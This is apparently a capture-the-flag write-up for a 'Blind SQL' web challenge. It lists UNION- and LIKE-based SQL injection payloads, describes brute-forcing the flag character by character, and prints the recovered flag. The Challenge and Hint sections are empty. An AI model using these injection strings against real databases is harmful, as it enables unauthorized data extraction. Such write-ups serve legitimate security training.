# Blind SQL
Web

## Challenge 

## Hint

## Solution

Now when we input any valid payload, we get the text `Wakanda` if there are results. We cannot see the results (blind).

From the previous challenge, we had this payload which produces `Wakanda`

> 2' or 1=1 UNION SELECT flag, NULL FROM flag;--

---

And if we put a payload that produces no results it will produce a blank line.

> 2' and 0=1;--

---

This also produces a blank line because the condition is not fulfilled.

> 2' and 0=1 UNION SELECT flag, NULL FROM flag WHERE 0=1;--

---

So we can use the LIKE clause to bruteforce

> 2' and 0=1 UNION SELECT flag, NULL FROM flag WHERE flag LIKE 'HATS{%';--

W
> 2' and 0=1 UNION SELECT flag, NULL FROM flag;--

If we were to bruteforce query each char of the flag, we can extract out the flag.

> 2' or 1=1 UNION SELECT flag, NULL FROM flag    WHERE flag LIKE 'HATS{%';--

And writing a script, we extract out each char

Success: HATS{you_dont_need_me_but_i_need_you_web_you_are_my_my_my_my_my_my_my_lover_yeet_ [81]

## Flag

	HATS{you_dont_need_me_but_i_need_you_web_you_are_my_my_my_my_my_my_my_lover_yeet}
